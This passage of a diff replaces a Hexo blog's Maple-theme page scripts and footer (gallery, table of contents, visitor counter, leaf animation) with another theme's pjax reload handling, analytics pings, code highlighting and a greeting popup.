-        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
-      });
-      $(this).find('.fancybox').each(function(){
-        $(this).attr('rel', 'article' + i);
-      });
-    });
-
-    Fancybox.bind('[data-fancybox="gallery"]', {
-        // options
-    })
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
   })
-</script>
 
-<!-- tocbot begin -->
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
-<script src="/lib/tocbot/tocbot.min.js"></script>
+  typeof panguInit === 'function' && panguInit()
 
-<script>
-  $(document).ready(() => {
-      tocbot.init({
-        // Where to render the table of contents.
-        tocSelector: '.post-toc',
-        // Where to grab the headings to build the table of contents.
-        contentSelector: '.post-content',
-        // Which headings to grab inside of the contentSelector element.
-        headingSelector: 'h1, h2, h3',
-        // For headings inside relative or absolute positioned containers within content.
-        hasInnerContainers: true,
-    });
-  })
-</script>
-<!-- tocbot end -->
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
 
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
 
-  </main>
-  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
-  <!-- busuanzi -->
-  
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<!-- Busuanzi Analytics -->
-<div class="flex items-center gap-2">
-  <span>Visitors</span>
-  <span id="busuanzi_value_site_uv"></span>
-  <span>Page Views</span>
-  <span id="busuanzi_value_site_pv"></span>
-</div>
-<!-- End Busuanzi Analytics -->
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
 
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
 
-  <!-- copyright -->
-  <div class="flex items-center gap-2">
-    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
-    <span>© 2022</span>
-    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
-    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
-  </div>
-  <!-- powered by -->
-  <div class="flex items-center gap-2">
-    <span>Powered by</span>
-    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
-    <span>&</span>
-    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
-  </div>
-
-</footer>
-
-  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
-    <span class="flex justify-center items-center text-sm">
-      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
-      <span id="scrollpercent"><span>0</span> %</span>
-    </span>
-  </div>
-  
-<script src="/js/main.js"></script>
-
-
-  <script>
-    $(document).ready(function () {
-      const mapleCount = "20";
-      const speed = "0.7";
-      const mapleEl = document.getElementById("maple");
-      const maples = Array.from({ length: mapleCount }).map(() => {
-        const maple = document.createElement("div");
-        const scale = Math.random() * 0.5 + 0.5;
-        const offset = Math.random() * 2 - 1;
-        const x = Math.random() * mapleEl.clientWidth;
-        const y = -Math.random() * mapleEl.clientHeight;
-        const duration = 10 / speed;
-        const delay = -duration;
-        maple.className = "maple";
-        maple.style.width = `${24 * scale}px`;
-        maple.style.height = `${24 * scale}px`;
-        maple.style.left = `${x}px`;
-        maple.style.top = `${y}px`;
-        maple.style.setProperty("--maple-fall-offset", offset);
-        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
-        maple.style.animation = `fall ${duration}s linear infinite`;
-        maple.style.animationDelay = `${delay}s`;
-        mapleEl.appendChild(maple)
-        return maple
-      })
-    });
-  </script>
-  
-
-
-  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
-</body>
-
-</html>
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
